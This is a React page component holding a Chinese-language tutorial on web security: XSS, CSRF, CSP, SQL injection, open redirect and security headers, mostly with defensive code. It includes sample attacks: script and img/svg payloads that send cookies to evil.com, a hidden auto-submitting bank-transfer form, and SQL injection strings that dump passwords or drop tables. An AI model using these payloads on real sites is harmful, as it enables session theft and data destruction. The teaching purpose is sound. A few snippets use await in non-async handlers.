'use client';

import { Card, CardBody, Chip, Divider } from '@heroui/react';
import {
  Calendar,
  User,
  Clock,
  Eye,
  ArrowLeft,
  ArrowRight,
  ShieldAlert,
  ShieldCheck,
  Lock,
  Database,
  FileCode2,
  AlertTriangle,
  CheckCircle,
  XCircle,
  Zap,
} from 'lucide-react';
import Link from 'next/link';
import { motion } from 'framer-motion';
import CodeBlock from '@/components/blog/CodeBlock';

const fadeInUp = {
  initial: { opacity: 0, y: 20 },
  whileInView: { opacity: 1, y: 0 },
  viewport: { once: true },
  transition: { duration: 0.5 },
};

export default function WebDevEP30() {
  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-rose-50 to-pink-50">

      {/* ── Hero ──────────────────────────────────────────────── */}
      <div className="bg-gradient-to-br from-red-900 via-rose-800 to-pink-800 text-white">
        <div className="max-w-4xl mx-auto px-6 py-20">
          <motion.div initial={{ opacity: 0, y: 30 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.6 }}>
            <div className="flex items-center gap-3 mb-6">
              <span className="bg-white/20 backdrop-blur text-white font-black px-4 py-1.5 rounded-full text-sm">EP.30</span>
              <span className="bg-white/10 text-white/80 px-3 py-1 rounded-full text-xs">Web Dev Bootcamp</span>
            </div>
            <h1 className="text-4xl md:text-5xl font-black mb-4 leading-tight">
              Web 安全實戰：<br />
              <span className="text-rose-300">XSS、CSRF、CSP 防禦</span>
            </h1>
            <p className="text-rose-100 text-lg mb-8 max-w-2xl">
              跨站腳本攻擊、跨站請求偽造、內容安全策略 — OWASP Top 10 前端工程師必懂的攻防
            </p>
            <div className="flex items-center gap-6 text-rose-200 text-sm flex-wrap">
              <span className="flex items-center gap-1.5"><User size={14} /> Joseph Chen</span>
              <span className="flex items-center gap-1.5"><Calendar size={14} /> 2026</span>
              <span className="flex items-center gap-1.5"><Clock size={14} /> 16 min read</span>
              <span className="flex items-center gap-1.5"><Eye size={14} /> XSS · CSRF · CSP · SQL Injection</span>
            </div>
          </motion.div>
        </div>
      </div>

      {/* ── Main Content ──────────────────────────────────────── */}
      <div className="max-w-4xl mx-auto px-6 py-12 space-y-12">

        {/* ── Section 1：XSS ─────────────────────────────────── */}
        <motion.div {...fadeInUp}>
          <Card className="shadow-lg border border-red-100">
            <CardBody className="p-8">
              <div className="flex items-center gap-3 mb-6">
                <div className="p-2 bg-red-100 rounded-lg">
                  <ShieldAlert className="text-red-600" size={22} />
                </div>
                <h2 className="text-2xl font-bold text-gray-800">
                  Section 1：XSS（Cross-Site Scripting）跨站腳本攻擊
                </h2>
              </div>

              <p className="text-gray-600 mb-6 leading-relaxed">
                XSS 是 OWASP Top 10 長年榜上的攻擊類型。攻擊者將惡意 JavaScript 注入到網頁中，當其他用戶查看這個頁面時，惡意腳本就在他們的瀏覽器中執行，可以竊取 Cookie、劫持 Session、偽造操作。XSS 分為三種類型：
              </p>

              <div className="grid md:grid-cols-3 gap-3 mb-6">
                {[
                  { type: 'Reflected XSS', desc: '反射型：攻擊程式碼夾帶在 URL 中，點擊連結觸發', risk: '中', color: 'yellow' },
                  { type: 'Stored XSS', desc: '儲存型：惡意碼存入資料庫，每個看此頁的用戶都中招', risk: '高', color: 'red' },
                  { type: 'DOM-based XSS', desc: 'DOM 型：前端 JS 直接操作惡意資料到 DOM 中', risk: '中', color: 'orange' },
                ].map(({ type, desc, risk, color }) => (
                  <div key={type} className={`p-4 bg-${color}-50 rounded-lg border border-${color}-200`}>
                    <div className="flex items-center justify-between mb-2">
                      <p className={`font-bold text-${color}-700 text-sm`}>{type}</p>
                      <span className={`text-xs bg-${color}-200 text-${color}-800 px-2 py-0.5 rounded-full`}>風險 {risk}</span>
                    </div>
                    <p className={`text-${color}-600 text-xs leading-relaxed`}>{desc}</p>
                  </div>
                ))}
              </div>

              <h3 className="text-lg font-bold text-gray-700 mb-3">Reflected XSS 攻擊示例</h3>
              <CodeBlock language="bash">
{` # 攻擊者構造一個惡意 URL 發給受害者：
https://example.com/search?q=<script>
  document.location='https://evil.com/steal?cookie='+document.cookie
</script>

# 如果服務器直接把 q 的值插入 HTML 回應：
# <p>搜尋結果：<script>document.location='...'</script></p>
# 用戶點開連結，Cookie 就被偷走了 `}
</CodeBlock>

              <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">Stored XSS 攻擊示例（最危險）</h3>
              <CodeBlock language="javascript">
{` // 攻擊者在留言框輸入以下內容：
// <script>
//   fetch('https://evil.com/steal?cookie=' + document.cookie)
// </script>

// 如果後端沒有消毒就存入資料庫：
// 之後每個瀏覽這個留言頁面的用戶都會觸發這段腳本
// 攻擊者無需與受害者有任何直接接觸

// 更隱蔽的版本（繞過簡單過濾）：
// <img src="x" onerror="fetch('https://evil.com/?c='+document.cookie)">
// <svg onload="eval(atob('base64編碼的惡意程式碼'))">
// <a href="javascript:void(fetch('https://evil.com'))">點我</a> `}
</CodeBlock>

              <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">React 前端防禦</h3>
              <CodeBlock language="tsx">
{` // ✅ React 預設安全：JSX 自動 escape HTML 特殊字元
function Comment({ text }: { text: string }) {
  return <p>{text}</p>;
  // 即使 text = "<script>alert('xss')</script>"
  // React 會自動轉義為：&lt;script&gt;alert('xss')&lt;/script&gt;
  // 瀏覽器顯示純文字，不執行
}

// ❌ 危險：dangerouslySetInnerHTML 繞過 React 的防護
function DangerousComment({ html }: { html: string }) {
  return <p dangerouslySetInnerHTML={{ __html: html }} />;
  // 如果 html 來自用戶輸入且未經消毒，就是 XSS 漏洞
  // 名字中的「dangerously」就是在警告你
}

// ✅ 如果真的必須渲染 HTML（例如富文本編輯器的輸出）
// 使用 DOMPurify 在客戶端消毒
import DOMPurify from 'dompurify';

function SafeHtmlContent({ html }: { html: string }) {
  const cleanHtml = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li'],
    ALLOWED_ATTR: ['href', 'title', 'target'],
    // 不允許 script、onerror、onclick 等危險屬性
    FORBID_TAGS: ['script', 'style', 'iframe'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick'],
  });

  return (
    <div
      dangerouslySetInnerHTML={{ __html: cleanHtml }}
      className="prose max-w-none"
    />
  );
} `}
</CodeBlock>

              <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">後端 Node.js 防禦</h3>
              <CodeBlock language="typescript">
{` // 方法 1：使用 html-escaper 轉義輸出
import { escape } from 'html-escaper';

app.post('/api/comments', (req, res) => {
  const userInput = req.body.comment;
  // 轉義 HTML 特殊字元：< > & " ' 等
  const escaped = escape(userInput);
  await db.comments.create({ content: escaped });
});

// 方法 2：使用 validator 套件驗證並清理輸入
import validator from 'validator';

app.post('/api/search', (req, res) => {
  const query = req.body.q;

  // 驗證輸入
  if (!validator.isLength(query, { min: 1, max: 200 })) {
    return res.status(400).json({ error: '搜尋字串長度不合法' });
  }

  // 轉義 HTML（即使後端存的是轉義後的版本也沒關係）
  const sanitized = validator.escape(query);
  res.json({ results: await search(sanitized) });
});

// 方法 3：使用白名單驗證（最嚴格，適合結構化資料）
function validateUsername(username: string): boolean {
  // 只允許英文、數字、底線、連字號，1-30 字元
  return /^[a-zA-Z0-9_-]{1,30}$/.test(username);
} `}
</CodeBlock>
            </CardBody>
          </Card>
        </motion.div>

        <Divider className="my-8" />

        {/* ── Section 2：CSRF ────────────────────────────────── */}
        <motion.div {...fadeInUp}>
          <Card className="shadow-lg border border-rose-100">
            <CardBody className="p-8">
              <div className="flex items-center gap-3 mb-6">
                <div className="p-2 bg-rose-100 rounded-lg">
                  <AlertTriangle className="text-rose-600" size={22} />
                </div>
                <h2 className="text-2xl font-bold text-gray-800">
                  Section 2：CSRF（Cross-Site Request Forgery）跨站請求偽造
                </h2>
              </div>

              <p className="text-gray-600 mb-4 leading-relaxed">
                CSRF 攻擊利用「瀏覽器自動帶 Cookie」的特性。只要用戶已登入某網站，攻擊者只需讓用戶的瀏覽器發出請求，就可以用用戶的身份執行操作，不需要竊取 Cookie。
              </p>

              <h3 className="text-lg font-bold text-gray-700 mb-3">攻擊原理（銀行轉帳示例）</h3>
              <CodeBlock language="bash">
{` # 攻擊步驟：
# 1. 用戶登入了 bank.com，瀏覽器儲存了 bank.com 的 Session Cookie
# 2. 用戶訪問了 evil.com（可能是誤點廣告、釣魚郵件中的連結）
# 3. evil.com 的頁面包含以下隱藏內容：

# 方式一：自動觸發的 GET 請求（圖片標籤）
# <img src="https://bank.com/transfer?to=hacker&amount=50000" width="0" height="0" />

# 方式二：自動提交的 POST 表單
# <form id="evil-form" action="https://bank.com/transfer" method="POST">
#   <input type="hidden" name="to" value="hacker_account" />
#   <input type="hidden" name="amount" value="50000" />
# </form>
# <script>document.getElementById('evil-form').submit();</script>

# 4. 瀏覽器自動帶上 bank.com 的 Cookie 發出請求
# 5. 伺服器看到有效的 Session，以為是用戶自己操作，執行轉帳！ `}
</CodeBlock>

              <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">防禦方式 1：CSRF Token（最常用）</h3>
              <CodeBlock language="typescript">
{` // ─── 後端（Express）───
import crypto from 'crypto';

// 1. 每次生成表單時，產生唯一的 CSRF Token
app.get('/transfer', (req, res) => {
  const csrfToken = crypto.randomBytes(32).toString('hex');
  req.session.csrfToken = csrfToken;  // 存在 Session 中
  res.json({ csrfToken });            // 傳給前端
});

// 2. 處理表單時，驗證 Token 是否一致
app.post('/api/transfer', (req, res) => {
  const tokenFromRequest = req.headers['x-csrf-token'] || req.body.csrfToken;
  const tokenFromSession = req.session.csrfToken;

  // Token 不一致 → 拒絕請求
  if (!tokenFromRequest || tokenFromRequest !== tokenFromSession) {
    return res.status(403).json({ error: 'CSRF token 無效，請刷新頁面重試' });
  }

  // Token 驗證通過：繼續處理業務邏輯
  const { to, amount } = req.body;
  await bankTransfer({ from: req.session.userId, to, amount });
  res.json({ success: true });
});

// ─── 前端（React）───
function TransferForm() {
  const [csrfToken, setCsrfToken] = useState('');

  useEffect(() => {
    // 頁面載入時取得 CSRF Token
    fetch('/api/csrf-token', { credentials: 'include' })
      .then(r => r.json())
      .then(data => setCsrfToken(data.csrfToken));
  }, []);

  const handleTransfer = async (data) => {
    const response = await fetch('/api/transfer', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': csrfToken,  // 每個 POST/PUT/DELETE 請求都帶上
      },
      credentials: 'include',       // 帶 Cookie
      body: JSON.stringify(data),
    });
    return response.json();
  };
} `}
</CodeBlock>

              <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">防禦方式 2：SameSite Cookie（現代首選）</h3>
              <CodeBlock language="typescript">
{` // 設定 Cookie 的 SameSite 屬性
// 這是目前最簡單有效的 CSRF 防禦方式
res.cookie('sessionId', sessionToken, {
  httpOnly: true,       // JS 無法用 document.cookie 讀取
  secure: true,         // 只在 HTTPS 連線中傳輸（生產環境必須）
  sameSite: 'strict',   // 'strict'：完全阻止跨站請求帶 Cookie
                        // 'lax'   ：允許頂層導航（點連結），阻止其他跨站請求
                        // 'none'  ：允許跨站（需要 secure: true）
  maxAge: 60 * 60 * 24, // 1 天（秒）
  path: '/',
});

// SameSite 的三種模式比較：
// strict → 最安全，但用戶從外部連結進入時 Cookie 不帶（可能導致需要重新登入）
// lax    → 平衡安全與 UX，Google 的預設值，推薦大多數情況使用
// none   → 用於第三方嵌入（例如嵌入到其他網站的 iframe），必須配合 secure

// 注意：SameSite 在舊版瀏覽器（IE11、Chrome < 51）不支援
// 需要同時保留 CSRF Token 作為後備防禦 `}
</CodeBlock>

              <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">防禦方式 3：Origin / Referer 標頭檢查</h3>
              <CodeBlock language="typescript">
{` // Origin Header 檢查：驗證請求來源
app.use('/api', (req, res, next) => {
  // 只檢查會改變狀態的請求（POST、PUT、DELETE、PATCH）
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();
  }

  const origin = req.headers.origin;
  const referer = req.headers.referer;

  // 允許的來源白名單
  const allowedOrigins = [
    'https://myapp.com',
    'https://www.myapp.com',
    // 開發環境
    ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000'] : []),
  ];

  // 優先用 Origin，Origin 不存在時用 Referer
  const requestOrigin = origin ?? (referer ? new URL(referer).origin : null);

  if (!requestOrigin || !allowedOrigins.includes(requestOrigin)) {
    return res.status(403).json({
      error: '請求來源不合法',
      received: requestOrigin,
    });
  }

  next();
});

// 注意：Origin/Referer 可能被隱私設定或代理移除
// 不應單獨依賴，應與 SameSite Cookie 或 CSRF Token 配合使用 `}
</CodeBlock>
            </CardBody>
          </Card>
        </motion.div>

        <Divider className="my-8" />

        {/* ── Section 3：CSP ─────────────────────────────────── */}
        <motion.div {...fadeInUp}>
          <Card className="shadow-lg border border-red-100">
            <CardBody className="p-8">
              <div className="flex items-center gap-3 mb-6">
                <div className="p-2 bg-red-100 rounded-lg">
                  <FileCode2 className="text-red-600" size={22} />
                </div>
                <h2 className="text-2xl font-bold text-gray-800">
                  Section 3：CSP（Content Security Policy）內容安全策略
                </h2>
              </div>

              <p className="text-gray-600 mb-4 leading-relaxed">
                CSP 是 XSS 的「第二道防線」。即使 XSS 注入成功，透過 HTTP Header 告訴瀏覽器「只允許執行來自特定來源的資源」，惡意腳本依然無法執行或連線到攻擊者的伺服器。
              </p>

              <div className="p-4 bg-red-50 rounded-lg border border-red-200 mb-6">
                <p className="text-red-800 text-sm font-medium mb-1">CSP 的核心思路</p>
                <p className="text-red-700 text-sm leading-relaxed">
                  傳統安全假設：「過濾掉壞的輸入就安全了」。CSP 的思路：「就算壞輸入進來了，瀏覽器也不執行不在白名單的程式碼」。這是<strong>縱深防禦（Defense in Depth）</strong>的體現。
                </p>
              </div>

              <h3 className="text-lg font-bold text-gray-700 mb-3">Express 中設定 CSP</h3>
              <CodeBlock language="typescript">
{` // Express middleware 手動設定 CSP Header
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', [
    // 預設：只允許來自自己的來源（same-origin）
    "default-src 'self'",

    // Script：只允許自己的 JS 文件 + 帶有特定 nonce 的 inline script
    // nonce 是每次請求隨機生成的值，注入 HTML 模板中
    "script-src 'self' 'nonce-{random_nonce_here}'",

    // Style：允許自己的 CSS + inline 樣式（Tailwind JIT 需要）
    "style-src 'self' 'unsafe-inline'",

    // 圖片：允許自己 + data URI + 任何 HTTPS 來源
    "img-src 'self' data: https:",

    // Fetch / XMLHttpRequest：只允許自己 + 指定 API
    "connect-src 'self' https://api.example.com wss://ws.example.com",

    // 字型：允許 Google Fonts
    "font-src 'self' https://fonts.gstatic.com",

    // 不允許在任何 iframe 中嵌入此頁面（防 Clickjacking）
    "frame-ancestors 'none'",

    // 不允許嵌入任何外部 iframe
    "frame-src 'none'",

    // 物件（Flash、Java Applet 等）：完全禁止
    "object-src 'none'",

    // 表單 action：只允許送出到自己
    "form-action 'self'",

    // 違反 CSP 時，瀏覽器發送報告到此 URL（便於監控）
    "report-uri /csp-violation-report",
  ].join('; '));

  next();
});

// 接收 CSP 違規報告
app.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const report = req.body['csp-report'];
  console.warn('CSP 違規：', {
    blockedUri: report['blocked-uri'],
    violatedDirective: report['violated-directive'],
    documentUri: report['document-uri'],
  });
  res.status(204).send();
}); `}
</CodeBlock>

              <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">Next.js 設定 CSP（next.config.js）</h3>
              <CodeBlock language="javascript">
{` // next.config.js
const nextConfig = {
  async headers() {
    return [
      {
        // 套用到所有路由
        source: '/(.*)',
        headers: [
          // Content Security Policy
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              // Next.js 的 script 需要 'unsafe-eval'（開發模式）或使用 nonce
              "script-src 'self' 'unsafe-eval'",
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "font-src 'self' https://fonts.gstatic.com",
              "connect-src 'self' https://api.example.com",
              "frame-ancestors 'none'",
            ].join('; '),
          },
          // 防止 Clickjacking（與 frame-ancestors 'none' 效果相同，向後相容）
          {
            key: 'X-Frame-Options',
            value: 'DENY',
          },
          // 防止 MIME type sniffing（防止瀏覽器猜測 Content-Type）
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff',
          },
          // 強制 HTTPS（HSTS）
          {
            key: 'Strict-Transport-Security',
            value: 'max-age=31536000; includeSubDomains; preload',
          },
          // 控制 Referrer 洩露
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin',
          },
        ],
      },
    ];
  },
};

module.exports = nextConfig; `}
</CodeBlock>

              <div className="mt-6 p-4 bg-amber-50 rounded-lg border border-amber-200">
                <div className="flex items-start gap-2">
                  <AlertTriangle className="text-amber-600 shrink-0 mt-0.5" size={16} />
                  <div>
                    <p className="text-amber-800 text-sm font-medium mb-1">CSP 的常見困境：inline script</p>
                    <p className="text-amber-700 text-sm leading-relaxed">
                      許多前端框架（包括 Next.js）需要 inline script 來注入初始狀態。解決方案是使用 <strong>nonce</strong>：每次請求隨機生成一個 token，只允許帶有這個 token 的 inline script 執行。Next.js 14+ 內建 CSP nonce 支援。
                    </p>
                  </div>
                </div>
              </div>
            </CardBody>
          </Card>
        </motion.div>

        <Divider className="my-8" />

        {/* ── Section 4：SQL Injection ────────────────────────── */}
        <motion.div {...fadeInUp}>
          <Card className="shadow-lg border border-rose-100">
            <CardBody className="p-8">
              <div className="flex items-center gap-3 mb-6">
                <div className="p-2 bg-rose-100 rounded-lg">
                  <Database className="text-rose-600" size={22} />
                </div>
                <h2 className="text-2xl font-bold text-gray-800">
                  Section 4：SQL Injection — 後端的基本功
                </h2>
              </div>

              <p className="text-gray-600 mb-4 leading-relaxed">
                SQL Injection 是最古老、最危險的攻擊之一。攻擊者透過在輸入中插入 SQL 語法，改變查詢的語義，可以讀取任意資料、刪除資料庫、甚至取得伺服器控制權。防禦方法很簡單卻也最重要：<strong>永遠使用參數化查詢</strong>。
              </p>

              <h3 className="text-lg font-bold text-gray-700 mb-3">攻擊示例</h3>
              <CodeBlock language="typescript">
{` // ❌ 危險：直接拼接用戶輸入到 SQL 字串中
async function findUser(email: string) {
  const query = \\`SELECT * FROM users WHERE email = '\\${email}'\\`;
  return await db.execute(query);
}

// 攻擊者輸入：admin@example.com' OR '1'='1
// 生成的 SQL：SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'
// 結果：回傳 users 表的所有行！

// 更嚴重的攻擊 — 刪除資料：
// 輸入：'; DROP TABLE users; --
// 生成：SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
// 結果：用戶表被清空！

// 資料洩露攻擊（UNION-based）：
// 輸入：' UNION SELECT username, password, email, 4 FROM users --
// 生成：SELECT * FROM users WHERE id='' UNION SELECT username, password, email, 4 FROM users --
// 結果：所有用戶的密碼被讀出 `}
</CodeBlock>

              <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">正確防禦方式</h3>
              <CodeBlock language="typescript">
{` // ✅ 方式 1：參數化查詢（Parameterized Query）— 永遠使用這個
// 參數用佔位符 $1、$2 表示，實際值獨立傳入，資料庫 driver 負責轉義
async function findUser(email: string) {
  const result = await db.query(
    'SELECT * FROM users WHERE email = $1',  // PostgreSQL 風格
    [email]  // 值作為獨立參數傳入，永遠安全
  );
  return result.rows[0];
}

// MySQL 風格（用 ? 作佔位符）：
async function findUserMySQL(email: string) {
  const [rows] = await pool.query(
    'SELECT * FROM users WHERE email = ?',
    [email]
  );
  return rows[0];
}

// ✅ 方式 2：使用 ORM（推薦，自動使用參數化查詢）
// Prisma
async function findUserPrisma(email: string) {
  return await prisma.user.findUnique({
    where: { email },  // Prisma 自動處理轉義，不可能 SQL Injection
    select: {
      id: true,
      name: true,
      email: true,
      // 不要 select password，只選需要的欄位
    },
  });
}

// TypeORM
const user = await userRepository.findOne({
  where: { email },  // 同樣安全
});

// ✅ 方式 3：如果必須用動態欄位名稱，用白名單驗證
const ALLOWED_SORT_COLUMNS = ['created_at', 'name', 'email', 'updated_at'];
const ALLOWED_SORT_ORDERS = ['ASC', 'DESC'];

async function getUsers(sortBy: string, sortOrder: string) {
  // 驗證排序欄位是否在白名單中（欄位名稱不能用參數化）
  if (!ALLOWED_SORT_COLUMNS.includes(sortBy)) {
    throw new Error('不合法的排序欄位');
  }
  if (!ALLOWED_SORT_ORDERS.includes(sortOrder.toUpperCase())) {
    throw new Error('不合法的排序方向');
  }

  // 排序欄位從白名單取得，值部分用參數化
  return await db.query(
    \\`SELECT * FROM users ORDER BY \\${sortBy} \\${sortOrder} LIMIT $1 OFFSET $2\\`,
    [limit, offset]
  );
} `}
</CodeBlock>

              <div className="mt-6 grid md:grid-cols-2 gap-4">
                <div className="p-4 bg-red-50 rounded-lg border border-red-200">
                  <p className="font-semibold text-red-700 mb-2 text-sm flex items-center gap-1">
                    <XCircle size={14} /> 永遠不要做的事
                  </p>
                  <ul className="text-red-600 text-xs space-y-1.5">
                    <li>• 用 string concatenation 拼接 SQL</li>
                    <li>• 用 eval() 執行動態查詢</li>
                    <li>• 相信前端傳來的欄位名稱</li>
                    <li>• 使用 root 帳號連接資料庫</li>
                  </ul>
                </div>
                <div className="p-4 bg-green-50 rounded-lg border border-green-200">
                  <p className="font-semibold text-green-700 mb-2 text-sm flex items-center gap-1">
                    <CheckCircle size={14} /> 最佳實踐清單
                  </p>
                  <ul className="text-green-600 text-xs space-y-1.5">
                    <li>• 永遠使用參數化查詢或 ORM</li>
                    <li>• 資料庫帳號使用最小權限原則</li>
                    <li>• 敏感欄位（如 password）用 bcrypt 加密</li>
                    <li>• 定期備份並測試還原</li>
                  </ul>
                </div>
              </div>
            </CardBody>
          </Card>
        </motion.div>

        <Divider className="my-8" />

        {/* ── Section 5：其他安全問題速查 ─────────────────────── */}
        <motion.div {...fadeInUp}>
          <Card className="shadow-lg border border-red-100">
            <CardBody className="p-8">
              <div className="flex items-center gap-3 mb-6">
                <div className="p-2 bg-red-100 rounded-lg">
                  <Zap className="text-red-600" size={22} />
                </div>
                <h2 className="text-2xl font-bold text-gray-800">
                  Section 5：其他常見安全問題速查
                </h2>
              </div>

              <p className="text-gray-600 mb-6 leading-relaxed">
                Web 安全的攻擊面遠不止 XSS 和 CSRF。以下是 OWASP Top 10 涵蓋的其他常見安全問題與對應防禦策略。
              </p>

              <div className="overflow-x-auto mb-6">
                <table className="w-full text-sm border-collapse">
                  <thead>
                    <tr className="bg-gradient-to-r from-red-800 to-rose-700 text-white">
                      <th className="px-4 py-3 text-left rounded-tl-lg font-semibold">攻擊類型</th>
                      <th className="px-4 py-3 text-left font-semibold">說明</th>
                      <th className="px-4 py-3 text-left rounded-tr-lg font-semibold">防禦方式</th>
                    </tr>
                  </thead>
                  <tbody>
                    {[
                      [
                        'Clickjacking',
                        '將你的網站透明地疊在惡意頁面上，誘騙用戶點擊',
                        'X-Frame-Options: DENY 或 frame-ancestors \'none\'',
                      ],
                      [
                        'Man-in-the-Middle',
                        '攔截網路通訊，竊取或竄改傳輸中的資料',
                        'HTTPS + HSTS (Strict-Transport-Security)',
                      ],
                      [
                        'Sensitive Data Exposure',
                        '密碼、Token 出現在 URL、Log、錯誤訊息中',
                        '用 POST body 傳遞敏感資料，不記錄敏感 Log',
                      ],
                      [
                        'Broken Authentication',
                        '弱密碼、明文存密碼、Session 未過期、暴力破解',
                        'bcrypt 存密碼、JWT 短效期、Rate Limit 登入',
                      ],
                      [
                        'Insecure Deserialization',
                        '惡意構造的序列化物件，執行任意程式碼',
                        '驗證反序列化資料型別，不執行用戶提供的程式碼',
                      ],
                      [
                        'Open Redirect',
                        '利用網站的重導向功能，把用戶導向釣魚網站',
                        '只允許重導向到白名單 URL，不信任 URL 參數',
                      ],
                      [
                        'Path Traversal',
                        '用 ../../ 存取超出允許範圍的檔案',
                        '驗證檔案路徑，使用 path.resolve 並檢查前綴',
                      ],
                      [
                        'Mass Assignment',
                        '攻擊者在請求中加入 isAdmin: true 等未預期欄位',
                        '使用白名單明確指定允許更新的欄位',
                      ],
                    ].map(([attack, desc, defense], i) => (
                      <tr key={attack} className={i % 2 === 0 ? 'bg-gray-50' : 'bg-white'}>
                        <td className="px-4 py-3 font-semibold text-red-700 whitespace-nowrap">{attack}</td>
                        <td className="px-4 py-3 text-gray-600 text-xs leading-relaxed">{desc}</td>
                        <td className="px-4 py-3 text-gray-600 text-xs leading-relaxed font-mono">{defense}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>

              <h3 className="text-lg font-bold text-gray-700 mb-3">Open Redirect 的正確防禦</h3>
              <CodeBlock language="typescript">
{` // ❌ 危險：直接使用 URL 參數中的 redirect 目的地
app.get('/login', (req, res) => {
  const redirectTo = req.query.redirect;
  // 如果 redirect = 'https://evil.com/phishing'
  // 登入後用戶會被導向釣魚網站！
  res.redirect(redirectTo);
});

// ✅ 方式 1：只允許相對路徑（不允許絕對 URL）
app.get('/login', (req, res) => {
  const redirectTo = req.query.redirect as string;

  // 確保只允許相對路徑，防止跳轉到外部網站
  const isRelativePath = redirectTo?.startsWith('/') && !redirectTo.startsWith('//');

  if (isRelativePath) {
    res.redirect(redirectTo);
  } else {
    res.redirect('/dashboard');  // 預設重導向
  }
});

// ✅ 方式 2：使用白名單
const ALLOWED_REDIRECT_DOMAINS = ['myapp.com', 'www.myapp.com', 'app.myapp.com'];

function isSafeRedirect(url: string): boolean {
  try {
    const parsed = new URL(url, 'https://myapp.com');
    return ALLOWED_REDIRECT_DOMAINS.includes(parsed.hostname);
  } catch {
    return false;  // 無效 URL
  }
}

app.get('/oauth/callback', (req, res) => {
  const redirectTo = req.query.state as string;
  if (isSafeRedirect(redirectTo)) {
    res.redirect(redirectTo);
  } else {
    res.redirect('/');
  }
}); `}
</CodeBlock>
            </CardBody>
          </Card>
        </motion.div>

        <Divider className="my-8" />

        {/* ── Section 6：安全 Headers ────────────────────────── */}
        <motion.div {...fadeInUp}>
          <Card className="shadow-lg border border-rose-100">
            <CardBody className="p-8">
              <div className="flex items-center gap-3 mb-6">
                <div className="p-2 bg-rose-100 rounded-lg">
                  <ShieldCheck className="text-rose-600" size={22} />
                </div>
                <h2 className="text-2xl font-bold text-gray-800">
                  Section 6：安全 Headers 完整清單
                </h2>
              </div>

              <p className="text-gray-600 mb-4 leading-relaxed">
                HTTP 安全標頭（Security Headers）是告訴瀏覽器如何處理你的網站的指令，可以在不修改任何業務程式碼的情況下大幅提升安全性。Express 的 <code className="bg-gray-100 px-1.5 py-0.5 rounded text-sm">helmet</code> 中間件一次設定所有常用安全標頭。
              </p>

              <h3 className="text-lg font-bold text-gray-700 mb-3">使用 Helmet（最快的方式）</h3>
              <CodeBlock language="typescript">
{` // npm install helmet
import helmet from 'helmet';
import express from 'express';

const app = express();

// 一行加上所有常用安全 Headers！
app.use(helmet());

// 等同於以下完整配置（可以自訂）：
app.use(
  helmet({
    // Content-Security-Policy
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", 'data:', 'https:'],
        connectSrc: ["'self'", 'https://api.example.com'],
        fontSrc: ["'self'", 'https://fonts.gstatic.com'],
        objectSrc: ["'none'"],
        frameAncestors: ["'none'"],
      },
    },

    // X-Content-Type-Options: nosniff
    // 防止瀏覽器猜測 MIME type（例如把 .jpg 當 .js 執行）
    noSniff: true,

    // X-Frame-Options: DENY
    // 防止在 iframe 中嵌入（Clickjacking 防禦）
    frameguard: { action: 'deny' },

    // Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    // 強制 HTTPS 連線，一年內不接受 HTTP
    hsts: {
      maxAge: 31536000,         // 1 年（秒）
      includeSubDomains: true,  // 子網域也強制 HTTPS
      preload: true,            // 可提交到瀏覽器的 HSTS preload list
    },

    // X-XSS-Protection: 1; mode=block
    // 舊版瀏覽器（IE）的 XSS 過濾器
    xssFilter: true,

    // X-Powered-By 移除（預設 Express 會暴露後端技術）
    // 攻擊者用這個資訊找對應版本的漏洞
    hidePoweredBy: true,

    // Referrer-Policy: no-referrer
    // 控制請求中 Referer header 的內容
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },

    // Cross-Origin-Opener-Policy
    crossOriginOpenerPolicy: { policy: 'same-origin' },

    // Permissions-Policy（限制瀏覽器 API 的使用）
    // 例如禁止使用攝影機、麥克風、地理位置
    // 需要額外設定，helmet 暫不直接支援
  })
); `}
</CodeBlock>

              <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">認識每個安全 Header</h3>
              <div className="space-y-3 mb-6">
                {[
                  {
                    header: 'Content-Security-Policy',
                    value: "default-src 'self'; script-src 'self'",
                    desc: '最重要的安全標頭，控制哪些資源可以被載入和執行。XSS 的最後防線。',
                    level: 'critical',
                  },
                  {
                    header: 'Strict-Transport-Security',
                    value: 'max-age=31536000; includeSubDomains',
                    desc: '強制瀏覽器一律使用 HTTPS 訪問此網站，防止 Man-in-the-Middle。',
                    level: 'high',
                  },
                  {
                    header: 'X-Content-Type-Options',
                    value: 'nosniff',
                    desc: '防止瀏覽器嗅探 MIME type，避免把文字檔案當腳本執行。',
                    level: 'medium',
                  },
                  {
                    header: 'X-Frame-Options',
                    value: 'DENY',
                    desc: '防止你的網頁被嵌入 iframe（Clickjacking 防禦），被 CSP frame-ancestors 取代。',
                    level: 'medium',
                  },
                  {
                    header: 'Referrer-Policy',
                    value: 'strict-origin-when-cross-origin',
                    desc: '控制 Referer 標頭揭露的資訊，防止敏感 URL 洩露給第三方。',
                    level: 'low',
                  },
                  {
                    header: 'Permissions-Policy',
                    value: 'camera=(), microphone=(), geolocation=()',
